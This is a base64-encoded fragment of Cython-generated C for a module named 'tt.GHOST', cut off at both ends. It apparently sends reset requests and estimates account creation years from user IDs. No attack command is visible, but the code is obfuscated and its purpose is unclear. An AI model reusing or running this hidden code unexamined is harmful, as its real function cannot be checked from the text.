CBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjU3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fcHl4X3ZfciA9IF9fcHl4X3RfNDtcbiAgICAgIF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF92X3IpO1xuICAgICAgX19weXhfciA9IF9fcHl4X3ZfcjtcbiAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgXG4gICAgfVxuICAgIF9fcHl4X0wzX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF8xMCA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTtcbiAgICBpZiAoX19weXhfdF8xMCkge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5yZXN0IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzQsICZfX3B5eF90XzcsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDI1OSwgX19weXhfTDVfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF92X2UgPSBfX3B5eF90Xzc7XG4gICAgICAge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzYgPSBOVUxMO1xuICAgICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99O1xuICAgICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfYnVpbHRpbl9wcmludCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMjYwLCBfX3B5eF9MMTRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2JhZF9yZXNldCk7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2JhZF9yZXNldDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MMTNfcmV0dXJuO1xuICAgICAgfVxuXG4gICAgICBcbiAgICAgICB7XG4gICAgICAgIF9fcHl4X0wxNF9lcnJvcjo7XG4gICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOyBfX3B5eF90XzE0ID0gMDsgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMTYgPSAwOyBfX3B5eF90XzE3ID0gMDsgX19weXhfdF8xOCA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8xNiwgJl9fcHl4X3RfMTcsICZfX3B5eF90XzE4KTtcbiAgICAgICAgICBpZiAoIHVubGlrZWx5KF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xMywgJl9fcHl4X3RfMTQsICZfX3B5eF90XzE1KSA8IDApKSBfX1B5eF9FcnJGZXRjaCgmX19weXhfdF8xMywgJl9fcHl4X3RfMTQsICZfX3B5eF90XzE1KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICBfX3B5eF90XzEwID0gX19weXhfbGluZW5vOyBfX3B5eF90XzExID0gX19weXhfY2xpbmVubzsgX19weXhfdF8xMiA9IF9fcHl4X2ZpbGVuYW1lO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE2LCBfX3B5eF90XzE3LCBfX3B5eF90XzE4KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEzKTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKF9fcHl4X3RfMTMsIF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOyBfX3B5eF90XzE0ID0gMDsgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMTYgPSAwOyBfX3B5eF90XzE3ID0gMDsgX19weXhfdF8xOCA9IDA7XG4gICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8xMDsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMTE7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8xMjtcbiAgICAgICAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MMTNfcmV0dXJuOiB7XG4gICAgICAgICAgX19weXhfdF8xOCA9IF9fcHl4X3I7XG4gICAgICAgICAgX19weXhfciA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgX19weXhfciA9IF9fcHl4X3RfMTg7XG4gICAgICAgICAgX19weXhfdF8xOCA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MNl9leGNlcHRfcmV0dXJuO1xuICAgICAgICB9XG4gICAgICB9XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w3X3RyeV9yZXR1cm46O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpO1xuICAgIGdvdG8gX19weXhfTDA7XG4gICAgX19weXhfTDZfZXhjZXB0X3JldHVybjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgZ290byBfX3B5eF9MMDtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMTlkYXRlKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0dF81R0hPU1RfMTlkYXRlID0geyJkYXRlIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydHRfNUdIT1NUXzE5ZGF0ZSwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8xOWRhdGUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwO1xuICBQeU9iamVjdCAqX19weXhfdl9JZCA9IDA7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzO1xuICAjZW5kaWZcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCogdmFsdWVzWzJdID0gezAsMH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZGF0ZSAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0lkLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMjYzLCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDI6XG4gICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMjYzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDI2MywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImRhdGUiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI2MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMjsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZGF0ZSIsIDEsIDIsIDIsIGkpOyBfX1BZWF9FUlIoMCwgMjYzLCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDI2MywgX19weXhfTDNfZXJyb3IpXG4gICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAyNjMsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07XG4gICAgX19weXhfdl9JZCA9IHZhbHVlc1sxXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImRhdGUiLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAyNjMsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuZGF0ZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJ0dF81R0hPU1RfMThkYXRlKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZiwgX19weXhfdl9JZCk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfMThkYXRlKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfSWQpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdWlkID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfNTtcbiAgaW50IF9fcHl4X3RfNjtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZGF0ZSIsIDApO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlOdW1iZXJfSW50KF9fcHl4X3ZfSWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF92X3VpZCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF90XzQgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCBfX3B5eF92X3VpZCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI2NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTI3OTAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI2NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyNjYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMCk7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMDtcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMjc5MDAxLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI2OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTc3NTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNjgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjY4LCBfX3